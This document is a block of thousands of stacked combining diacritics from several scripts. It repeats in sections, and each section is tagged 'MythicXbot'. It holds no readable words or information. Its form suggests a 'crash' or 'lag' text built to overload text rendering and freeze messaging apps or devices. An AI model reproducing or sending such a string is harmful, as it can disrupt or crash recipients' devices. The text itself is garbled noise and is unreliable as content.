ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ